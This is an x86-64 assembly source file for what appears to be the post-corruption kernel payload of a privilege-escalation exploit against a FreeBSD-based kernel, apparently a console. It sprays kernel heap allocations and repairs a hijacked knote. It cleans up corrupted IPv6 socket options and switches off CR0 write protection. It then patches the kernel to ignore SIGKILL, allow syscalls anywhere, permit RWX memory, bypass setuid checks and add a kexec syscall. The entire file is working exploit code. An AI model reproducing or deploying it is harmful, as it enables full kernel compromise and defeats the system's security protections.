use64
start:
push rdi
push rsi
mov rcx, 1024
.malloc_loop:
push rcx
lea r8, [rel start]
mov rax, [r8+4072] ; kernel_base
mov rdi, 0xf8 ; sz
lea rsi, [rax+0x1a7ae50] ; M_TEMP
mov rdx, 2 ; M_WAITOK
lea rax, [rax+0x301840] ; malloc
call rax
pop rcx
loop .malloc_loop
pop rsi
pop rdi
lea r8, [rel start]
; fix knote
mov rax, [r8+4064] ; real kn_fop
mov [rdi+104], rax
; cleanup
mov r9, [gs:0] ; struct thread
mov r9, [r9+8] ; struct proc
mov r9, [r9+0x48] ; struct filedesc
mov r9, [r9] ; fd_ofiles
mov eax, [r8+4084] ; master_sock
mov r10, [r9+8*rax] ; struct file
mov r10, [r10] ; struct socket
mov r10, [r10+24] ; pcb
mov r10, [r10+280] ; pktopts
mov qword [r10+16], 0 ; pktinfo
mov eax, [r8+4088] ; overlap_sock
mov r10, [r9+8*rax] ; struct file
mov r10, [r10] ; struct socket
mov r10, [r10+24] ; pcb
mov r10, [r10+280] ; pktopts
mov qword [r10+104], 0 ; rthdr
mov eax, [r8+4092]
mov r10, [r9+8*rax] ; struct file
mov r10, [r10] ; struct socket
mov r10, [r10+24] ; pcb
mov r10, [r10+280] ; pktopts
mov qword [r10+16], 0 ; pktinfo
; disable kernel WP
cli
mov rax, cr0
or rax, 0x10000
xor rax, 0x10000
mov cr0, rax
; apply patches
mov rax, [r8+4072] ; kernel_base
;; ignore SIGKILL
mov byte [rax+0x30f137], 0xeb
;; avoid panic with "vputx: negative ref cnt"
;; this happens very late during shutdown, so we better ignore it so the system can turn off
mov dword [rax+0x29eec4], 0
;; syscall everywhere
mov dword [rax+0x490], 0
mov qword [rax+0x4b2], 0x19de9
;; mmap rwx (from mira)
mov byte [rax+0x1d2336], 0x37
mov byte [rax+0x1d2339], 0x37
;; mprotect rwx (from mira)
mov word [rax+0x264c08], 0x04eb
;; setuid (from mira)
mov byte [rax+0x87b70], 0xb8
mov dword [rax+0x87b71], 0
;; kexec (syscall #11)
mov qword [rax+0x1125870], 2
lea rcx, [rax+0x128b6c]
mov [rax+0x1125878], rcx
mov rcx, 0x100000000
mov [rax+0x1125898], rcx
; restore kernel WP
mov rax, cr0
or rax, 0x10000
mov cr0, rax
sti
; call the real f_detach
mov rax, [r8+4056] ; real f_detach
jmp rax

;; 0x29287 eb = ignore sigkill
